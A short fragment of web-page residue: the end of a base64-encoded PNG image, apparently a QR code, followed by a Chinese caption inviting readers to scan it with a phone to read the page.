eIKAqYaAu3DGiJv4p3EzxTOrNKPYX/mzVUIsTfoaB88xrlOCL0WIveeINbQ39qsCacDUfMVrz2B4d9laUoOb8XrewgxfdcJXaPccZU7+l0nhPFZEBx0dI8K1UdRaZmD6Cevw7rXFdrzCK4bMj2t14vD/4QL8WqA6+ht+1XitRCij3IHnHMQGszRz4Luc/+MELo51wlhr8kDIyevAkIDZN0F0D43d8KDi3VDHjywZ9vXQJ59wg/2bwPRlXwkqudAXNusuec9LutnuXsJ7VHumHHWIPYImCr/MXkTbwmwvR3d0tMv70FYmSB6SHfYB6EB6z81/vVhv9oN8b6gTwvG3L4Kj5OvPI9w7mfMtRB7y9wsd48KZ3XSXKP8GBD7gBGP3rO1+wuHgZwVLf41J7AG8ppzvvyUlw0E+pX27nRFHeYyQq8BslTm7gVsH8LQ/74IgsuFEBx0dI/Klznn9mesNHMZoT8XIn/ZQPJG/vV89vM/fSAQk8+bgJHzKyz7jjlEHYyvfOharoPgzUGsAVMlej9CG5QfA2i3ESK3H2INmCox93z6QModLPL0BNZATo/mPcIwkHx9qvzRbbpHrjMHtOue9WNuf+Yhaq1lzD7nWXdeaeauontVmHtYh9g31G+7w0Byk5W//gTaQKBPDu7ns6361SC0T7nDXEaIZ9ojtA6heS2UrlB+JSB6QEfXwZzTcxT2Z4ReC/s8+2a5ejvaQGYFS3vdCayBvO6sLz3pfwAAAP//d5GF3gAAAAZJREFUAwCMsmGhCgCBCwAAAABJRU5ErkJggg==)

手机扫码阅读
